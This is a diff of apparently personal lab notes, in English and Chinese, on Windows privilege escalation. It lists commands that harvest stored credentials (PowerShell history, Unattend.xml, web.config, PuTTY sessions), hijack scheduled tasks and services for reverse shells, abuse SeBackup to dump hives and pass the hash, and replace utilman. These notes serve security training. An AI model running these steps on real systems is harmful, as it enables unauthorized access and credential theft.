@@ -1,13 +1,11 @@
 ## Windows Privilege Escalation : 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		--> User: thm-unpriv
 		--> Password: Password321
 		--> ip: 10.10.230.106
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	--> RDP :  
 		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.230.106 /u:thm-unpriv /p:'Password321'
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Unattended Windows Installations (無人值守的 Windows 安裝)
+###  Unattended Windows Installations (無人值守的 Windows 安裝)
 		--> 允許透過網路將單一作業系統映像部署到多台主機
 		--> 可能儲存在 以下位置
 			C:\Unattend.xml
@@ -22,21 +20,18 @@
 			    <Domain>thm.local</Domain>
 			    <Password>MyPassword123</Password>
 			</Credentials>
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Powershell 歷史
+###  Powershell 歷史
 		--> cmd.exe : 
 			--> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 		--> Powershell:
 			--> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> 儲存的 Windows 憑證
+###  儲存的 Windows 憑證
 		--> cmdkey /list
 		--> runas /savecred /user:mike.katz cmd.exe
 			=> that a shell 
 			=> C:\Windows\system32>
 				--> cd ../../Users/mike.katz/Desktop
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Internet 資訊服務  (IIS )配置
+###  Internet 資訊服務  (IIS )配置
 		--> IIS Windows 安裝上的預設 Web 伺服器
 		--> 檔案 : web.config
 			--> C:\inetpub\wwwroot\web.config
@@ -46,14 +41,12 @@
 		--> find database connection strings :
 			=> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 		
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> 從軟體檢索憑證：PuTTY
+###  從軟體檢索憑證：PuTTY
 		--> PuTTY 是 Windows 系統上常見的 SSH 用戶端
 		--> 儲存會話、儲存 IP、使用者和其他配置 : 
 		--> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 			=> Simon Tatham 是 PuTTY 的創建者 //不是我們要檢索使用者名稱
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Scheduled Tasks : 
+###  Scheduled Tasks : 
 		--> 查看目標系統上的排程任務
 		--> schtasks : 可以使用不帶任何選項的命令從命令列列出計劃任務
 			--> schtasks /query /tn(task name) vulntask /fo list /v 
@@ -70,8 +63,7 @@
 			=> 啟動 : schtasks /run /tn vulntask
 		--> kali : nc -lvp 4444
 			=> C:\Windows\system32>
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> AlwaysInstallElevated (始終安裝提升)
+###  AlwaysInstallElevated (始終安裝提升)
 		--> Windows 安裝程式檔案（也稱為 .msi 檔案）
 		--> 產生一個以管理員權限執行的惡意 MSI 檔案
 		
@@ -87,8 +79,7 @@
 ## Abusing Service Misconfigurations : 濫用服務錯誤配置
 	=> C:\Windows\system32> 
 	=> cmd : sc | Ps: sc.exe
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Windows Services : 
+### Windows Services : 
 		--> Windows 服務由服務控制管理員(SCM)
 			--> sc qc apphostsvc : 檢查 apphostsvc 服務配置
 				=> BINARY_PATH_NAME   : 指定關聯的可執行檔
@@ -102,9 +93,8 @@
 				=> svchost.exe => go to server 
 				=> AppHostSvc => Properties => Security 
 				--> 服務配置 : HKLM\SYSTEM\CurrentControlSet\Services\
-				
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Insecure Permissions on Service Executable (服務可執行檔案的不安全權限)
+	
+###  Insecure Permissions on Service Executable (服務可執行檔案的不安全權限)
 		--> Splinterware System Scheduler  
 			--> 查詢服務 : sc qc WindowsScheduler
 				=>  BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
@@ -131,8 +121,7 @@
 			
 			--> cd ../../Users/svcusr1/Desktop 
 				
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Unquoted Service Paths (未加引號的服務路徑)
+###  Unquoted Service Paths (未加引號的服務路徑)
 		--> 有空格 
 			--> sc qc "vncserver"
 				-->  正確 "C:\Program Files\RealVNC\VNC  
@@ -165,8 +154,7 @@
 			
 			--> cd ../../Users/svcusr2/Desktop
 			
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Insecure Service Permissions (不安全的服務權限)
+###  Insecure Service Permissions (不安全的服務權限)
 		--> https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
 		--> C:\\tools
 		--> C:\tools\AccessChk> accesschk64.exe -qlc thmservice
@@ -187,15 +175,13 @@
 			--> cd ../../Users/Administrator/Desktop
 ## Abusing dangerous privileges :
 	=> nt authority\system
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Windows Privileges
+###  Windows Privileges
 		--> 檢查 權限 : whoami /priv
 		
 		--> 可用權限的完整清單 : https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
 		--> 可利用權限的完整清單 : https://github.com/gtworek/Priv2Admin
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> SeBackup 和 SeRestore 
-		-->xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.28.124 /u:THMBackup /p:'CopyMaster555'
+### SeBackup 和 SeRestore 
+		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.28.124 /u:THMBackup /p:'CopyMaster555'
 		--> 權限允許使用者讀取和寫入系統中的任何文件
 		--> 允許某些使用者從系統執行備份，而無需完全管理權限
 		--> Run as administrator 「以管理員身份開啟」
@@ -219,8 +205,7 @@
 		--> 使用管理員hash=> 獲得具有系統權限的存取權限：
 			--> python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.28.124
  
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> SeTakeOwnership (所有權)
+###  SeTakeOwnership (所有權)
 		--> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.28.124 /u:THMTakeOwnership /p:'TheWorldIsMine2022'
 		--> 允許使用者取得系統上任何物件的所有權，包括檔案和註冊表項
 		
@@ -237,8 +222,7 @@
 				
 			--> 觸發 utilman，我們將從開始按鈕鎖定螢幕： (Lock)
 				--> 按 "Ease of Access" button
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~			
-	--> SeImpersonate / SeAssignPrimaryToken
+###  SeImpersonate / SeAssignPrimaryToken
 		-->允許進程模擬其他使用者並代表他們執行操作
 		--> 1. 產生一個進程，以便使用者可以連接該進程並對其進行身份驗證，以進行模擬
 		--> 2.找到一種方法來強制特權使用者連線並驗證產生的惡意進程
@@ -267,7 +251,7 @@
 			--> wmic product get name,version,vendor
 			--> 搜索已安裝軟體的現有漏洞
 			
-	--> Case Study: Druva inSync 6.6.3
+###  Case Study: Druva inSync 6.6.3
 		--> 以系統權限在連接埠 6064 上執行 RPC
 		--> C:\tools\Druva_inSync_exploit.txt
 		--> change the $cmd 
@@ -281,13 +265,13 @@
             
 ## Tools of the Trade :
 	=> need 上傳到目標系統並在那裡運行它們  	
-	--> WinPEAS
+###  WinPEAS
 		--> 用於列舉目標系統以發現權限提昇路徑的腳本
 		--> https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 		--> cmd : 
 			--> C:\> winpeas.exe > outputfile.txt
 			
-	--> PrivescCheck :
+###  PrivescCheck :
 		--> 是一個PowerShell腳本，用於搜尋目標系統上的常見權限升級
 		--> https://github.com/itm4n/PrivescCheck
 		--> PS :
@@ -295,8 +279,7 @@
 			--> PS C:\> . .\PrivescCheck.ps1
 			--> PS C:\> Invoke-PrivescCheck
 			 		
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> WES-NG: Windows Exploit Suggester - Next Generation
+### WES-NG: Windows Exploit Suggester - Next Generation
 		--> 是一個 Python 腳本
 		--> https://github.com/bitsadmin/wesng
 		
@@ -306,7 +289,7 @@
 		--> 將輸出定向到您需要移動到攻擊電腦的 .txt 檔案
 			--> user@kali$ wes.py systeminfo.txt
 		
-	--> Metasploit :
+###  Metasploit :
 		--> Meterpreter shell 
 			--> multi/recon/local_exploit_suggester 
 ## command : 
@@ -321,4 +304,3 @@
 	--> 授予權限 : 
 		--> chmod 777 
 		--> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
